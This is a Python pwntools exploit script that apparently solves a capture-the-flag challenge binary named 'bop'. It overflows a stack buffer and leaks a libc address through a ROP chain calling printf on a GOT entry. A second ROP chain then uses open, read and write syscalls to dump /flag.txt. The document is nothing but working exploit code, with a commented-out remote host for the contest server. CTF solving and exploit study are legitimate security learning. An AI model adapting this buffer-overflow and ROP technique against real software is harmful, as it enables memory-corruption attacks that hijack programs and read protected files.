#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

p=process('./bop',env={'LD_PRELOAD':'./libc-2.31.so'})
# p = remote("mc.ax", 30284)
libc=ELF("./libc-2.31.so")

ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)

e = ELF("./bop")
rdi = 0x4013d3
ret = 0x40101a
main = 0x4012fd
bss = 0x404080
rsi = 0x4013d1 # pop rsi; pop r15; ret

payload = b"A"*8
payload += b"/flag.txt\0"
payload += b"A"*22
payload += p64(ret)
payload += p64(ret)
payload += p64(rdi)
payload += p64(e.got['printf'])
payload += p64(rsi)
payload += p64(e.got['printf'])
payload += p64(e.got['printf'])
payload += p64(e.plt['printf'])
payload += p64(ret)
payload += p64(main)

sla(b"? ", payload)


leak = u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - 0x60770 - 0x46a0 + 0x3180
info(str(hex(libc.address)))

syscall = libc.sym['read']+0x10
rax = libc.address+0x036174
rdx = libc.address+0x142c92

# gdb.attach(p,'''
#            b gets
#            ''')

payload = b"A"*40
payload += p64(rdi) + p64(bss+0x800)
payload += p64(e.plt["gets"])
payload += p64(rdi)+p64(bss+0x800)
payload += p64(rsi) + p64(0) + p64(0)
payload += p64(rdx) + p64(0) 
payload += p64(rax) + p64(2)
payload += p64(syscall)

payload += p64(rdi)+p64(3)
payload += p64(rsi)+p64(bss+0x800) + p64(0)
payload += p64(rax)+p64(0) 
payload += p64(rdx)+p64(0xff) 
payload += p64(syscall)

payload += p64(rdi)+p64(1)
payload += p64(rsi)+p64(bss+0x800) + p64(0)
payload += p64(rax)+p64(1) 
payload += p64(rdx)+p64(0xff)
payload += p64(syscall)
# gdb.attach(p)

sla(b"? ", payload)
input()
sl(b"./flag.txt\0")

print(p.recv(1024))

p.interactive()
